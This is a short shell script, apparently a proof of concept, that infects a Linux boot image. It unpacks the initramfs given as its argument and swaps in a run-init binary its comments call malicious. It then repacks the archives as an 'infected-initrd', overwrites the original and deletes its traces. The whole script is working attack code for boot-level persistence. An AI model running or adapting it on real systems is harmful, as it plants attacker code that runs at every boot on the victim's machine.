#!/bin/sh

# prepare the working directories in /tmp
mkdir /lost+found/new-initramfs
cd /lost+found/new-initramfs

# extract initrd image
unmkinitramfs $1 .

# copy malicious run-init to victim
rm /lost+found/new-initramfs/main/usr/bin/run-init
cp /lost+found/run-init /lost+found/new-initramfs/main/usr/bin/run-init

# add the first microcode firmware
cd early
find . -print0 | cpio --null --create --format=newc > /lost+found/infected-initrd

# add the second microcode firmware
cd ../early2
find kernel -print0 | cpio --null --create --format=newc >> /lost+found/infected-initrd

# add the ram fs file system
cd ../main
find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/infected-initrd

# replace initrd
rm $1 && cp /lost+found/infected-initrd $1

# clean stuff
rm -r /lost+found/new-initramfs /lost+found/infected-initrd
